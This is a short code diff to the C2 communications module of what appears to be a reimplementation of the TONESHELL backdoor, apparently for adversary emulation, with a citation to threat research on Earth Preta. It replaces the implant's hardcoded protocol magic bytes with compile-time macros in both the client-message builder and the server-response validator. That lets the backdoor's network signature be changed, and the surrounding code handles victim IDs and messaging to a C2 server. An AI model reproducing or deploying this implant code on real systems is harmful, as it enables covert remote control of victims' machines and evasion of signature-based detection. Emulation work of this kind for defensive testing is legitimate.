@@ -12,6 +12,16 @@
 #error "comms.cpp must have PORT set at compile time"
 #endif
 
+#ifndef TONESHELL_MAGIC_0
+#error "comms.cpp must have TONESHELL_MAGIC_0 set at compile time"
+#endif
+#ifndef TONESHELL_MAGIC_1
+#error "comms.cpp must have TONESHELL_MAGIC_1 set at compile time"
+#endif
+#ifndef TONESHELL_MAGIC_2
+#error "comms.cpp must have TONESHELL_MAGIC_2 set at compile time"
+#endif
+
 DWORD sendAndReceive(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, unsigned char msg_type, void* data, size_t data_len);
 
 // Helper function to send client message to C2 server
@@ -326,7 +336,7 @@ DWORD SetClientMsg(client_message* msg, unsigned char* victim_id, unsigned char 
         data_len = MSG_DATA_MAX_LEN;
     }
 
-    unsigned char magic[3] = {0x18, 0x04, 0x04};
+    unsigned char magic[3] = {TONESHELL_MAGIC_0, TONESHELL_MAGIC_1, TONESHELL_MAGIC_2};
     pi_memcpy(msg->magic, magic, sizeof(magic));
     size_t payload_size = data_len + sizeof(msg->msg_type) + sizeof(msg->victim_id);
     SET_PAYLOAD_SIZE(msg, payload_size);
@@ -364,7 +374,7 @@ DWORD SetClientMsg(client_message* msg, unsigned char* victim_id, unsigned char 
  *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
  */
 BOOL ValidateMagic(server_response* rsp) {
-    unsigned char magic[3] = {0x18, 0x04, 0x04};
+    unsigned char magic[3] = {TONESHELL_MAGIC_0, TONESHELL_MAGIC_1, TONESHELL_MAGIC_2};
     for (size_t i = 0; i < sizeof(magic); i++) {
         if (rsp->magic[i] != magic[i]) {
             return false;
